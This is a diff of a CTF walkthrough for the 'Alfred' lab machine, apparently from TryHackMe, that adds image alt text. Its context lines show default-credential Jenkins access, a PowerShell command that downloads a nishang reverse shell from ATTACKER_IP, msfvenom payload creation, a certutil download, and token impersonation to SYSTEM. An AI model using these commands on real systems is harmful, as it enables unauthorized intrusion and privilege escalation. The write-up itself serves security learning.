@@ -28,21 +28,21 @@ I performed an **nmap** aggressive scan on the target to identify the open ports
 nmap -A -p- TARGET --min-rate 10000 -Pn -oN alfred.nmap
 ```
 
-![](https://cdn.ziomsec.com/alfred/1.webp)
+![performing an nmap scan on alfred machine](https://cdn.ziomsec.com/alfred/1.webp)
 
 ## Initial Foothold
 
 The target had  http service running on port 80 and 8080, so I accessed them through my browser.
 
-![](https://cdn.ziomsec.com/alfred/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/alfred/2.webp)
 
 I found a **jenkins** login page on port 8080.
 
-![](https://cdn.ziomsec.com/alfred/3.webp)
+![accessing jenkins login page](https://cdn.ziomsec.com/alfred/3.webp)
 
 I also viewed the *robots.txt* file that was identified by the **nmap** scan but found nothing. The default username used by `Jenkins` is `admin`, so I tried some default credentials and logged in using `admin:admin`
 
-![](https://cdn.ziomsec.com/alfred/4.webp)
+![logging into jenkins](https://cdn.ziomsec.com/alfred/4.webp)
 
 Jenkins is a tool that is used to build and test software automatically. It is used in devops and has the ability to build and run commands as part of a job or pipeline. Since I got access to it, I could execute code to get a reverse shell. I downloaded the `Invoke-PowerShellTcp.ps1` script from **nishang**.
 - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
@@ -53,11 +53,11 @@ I then started an http server to host the powershell script.
 python3 -m http.server 80
 ```
 
-![](https://cdn.ziomsec.com/alfred/5.webp)
+![hosting reverse shell script](https://cdn.ziomsec.com/alfred/5.webp)
 
 On **Jenkins**, I created a new project -> new build and then added a command for it to download the reverse shell script and send a shell to my system.
 
-![](https://cdn.ziomsec.com/alfred/6.webp)
+![downloading the reverse shell script on jenkins](https://cdn.ziomsec.com/alfred/6.webp)
 
 I used the following command:
 
@@ -65,19 +65,19 @@ I used the following command:
 powershell.exe iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port ATTACKER_PORT)
 ```
 
-![](https://cdn.ziomsec.com/alfred/7.webp)
+![downloading the reverse shell script on jenkins](https://cdn.ziomsec.com/alfred/7.webp)
 
 Finally, I started a **netcat** listener and built the project.
 
-![](https://cdn.ziomsec.com/alfred/8.webp)
+![executing the reverse shell script](https://cdn.ziomsec.com/alfred/8.webp)
 
-![](https://cdn.ziomsec.com/alfred/9.webp)
+![executing the reverse shell script](https://cdn.ziomsec.com/alfred/9.webp)
 
 I got a reverse shell from the target and captured the user flag from *`C:\Users\bruce\Desktop`*.
 
-![](https://cdn.ziomsec.com/alfred/10.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/alfred/10.webp)
 
-![](https://cdn.ziomsec.com/alfred/11.webp)
+![capturing the user flag](https://cdn.ziomsec.com/alfred/11.webp)
 
 ## Privilege Escalation
 
@@ -87,7 +87,7 @@ I viewed my privileges and found that I had `SeImpersonatePrivilege`. This allow
 whoami /priv
 ```
 
-![](https://cdn.ziomsec.com/alfred/12.webp)
+![checking user privileges](https://cdn.ziomsec.com/alfred/12.webp)
 
 **Metasploit**'s **incognito** module could be used to exploit this, so I created a payload using **msfvenom** and executed it on the target to get a **meterpreter** shell.
 
@@ -97,13 +97,13 @@ $ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST
 $ python3 -m http.server 8080
 ```
 
-![](https://cdn.ziomsec.com/alfred/13.webp)
+![generating an msfvenom payload](https://cdn.ziomsec.com/alfred/13.webp)
 
-![](https://cdn.ziomsec.com/alfred/14.webp)
+![stating a metasploit listener](https://cdn.ziomsec.com/alfred/14.webp)
 
 > The payload can be downloaded on the target using `certutil.exe -urlcache -split -f http://ATTACKER:PORT/rev.exe`
 
-![](https://cdn.ziomsec.com/alfred/15.webp)
+![downloading the payload on the target and executing it](https://cdn.ziomsec.com/alfred/15.webp)
 
 After getting **meterpreter** shell, I loaded the **incognito** module for token impersonation.
 
@@ -111,7 +111,7 @@ After getting **meterpreter** shell, I loaded the **incognito** module for token
 load incognito
 ```
 
-![](https://cdn.ziomsec.com/alfred/16.webp)
+![loading incognito module in meterpreter shell](https://cdn.ziomsec.com/alfred/16.webp)
 
 I then listen available tokens and Found `NT AUTHORITY\SYSTEM`. I then impersonated the account and got SYSTEM access.
 
@@ -121,7 +121,7 @@ $ imperosnate_token "NT AUTHORITY\SYSTEM"
 $ getuid
 ```
 
-![](https://cdn.ziomsec.com/alfred/17.webp)
+![attempting to escalate to NT AUTHORITY\SYSTEM](https://cdn.ziomsec.com/alfred/17.webp)
 
 I had a 32 bit session so I upgraded it to 64 bit by migrating to a 64 bit process. This was required because a 32 bit meterpreter process cannot host 64 bit code or fully interact with 64 bit only parts of Windows.
 
@@ -137,7 +137,7 @@ Finally, I captured the root flag from `C:\Windows\System32\config\root.txt`
 $ cat C:/Windows/System32/config/root.txt
 ```
 
-![](https://cdn.ziomsec.com/alfred/18.webp)
+![capturing the root flag](https://cdn.ziomsec.com/alfred/18.webp)
 
 ## Closure
 
